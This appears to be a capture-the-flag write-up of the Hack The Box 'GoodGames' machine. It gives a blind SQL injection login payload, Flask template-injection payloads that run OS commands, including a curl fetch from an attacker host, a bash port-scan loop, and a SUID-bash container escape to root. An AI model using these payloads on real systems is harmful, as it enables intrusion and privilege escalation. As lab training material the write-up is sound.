Started with a nmap scan
```
80 Apache httpd 2.4.51
```
The nmap scan shows there is a domain for the site `goodgames.htb`  the site is pretty much a static site the cart don't work and the email subscribe don't work 
Starting a gobuster scan
```
/blog
login
/profile
/signup
/forgot-password
/comming-soon
```
Checking out the login and adding a `'` to the password gives a 500 internal error and with this payload we can extract the database information `email=admin@admin.com' AND (SELECT 1036 FROM (SELECT(SLEEP(5)))QBkC) AND 'jjOV'='jjOV&password=test` we got a database named `main` and we have a table named `user` we got a user `admin@goodgames.htb` with a password hash `2b22337f218b2d82dfc3b...............` cracked it to `supe..............` after looking in found a subdomain called `internal-administration.goodgames.htb` going to fuzz and see if there is anymore did not find anymore sub domains when going to the internal domain its a flask volt instance there not much we can do with the site a lot of its taken out but if we go to the settings page and enter this payload as are name `{{7*7}}` and save it we get `49` back after a lot of enumeration we got code exaction `{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}` using a command like this we can download a file and try to exacute it `{{config.__class__.__init__.__globals__['os'].popen('curl${IFS}10.10.14.2:8000/test').read()}}` now we got a call back as root but were in a docker container since we can read the home folder I ran mount and its a read write file system then I looked at the network adapter and found are ip is `172.19.0.2` so lets see if we can network scan the other host with this command 
`for PORT in {0..1000}; do timeout 1 bash -c "/dev/null" 2>/dev/null && echo "port $PORT is open"; done` 
and we have port `22,80` open so lets see if we can ssh into `augustus` and they do but we cant download anymore stuff as this user so I had to change permissions on linpeas it showed nothing so I had to think and the user home folder is mounted to the docker and we can access it on both host what if we just put bash into the folder and then ran it for the other user and we can get root 
```
As augustus on host machine cp /bin/bash .
As root in the docker container chown root:root bash chmod 4755 bash
./bash -p
```
and now we are root 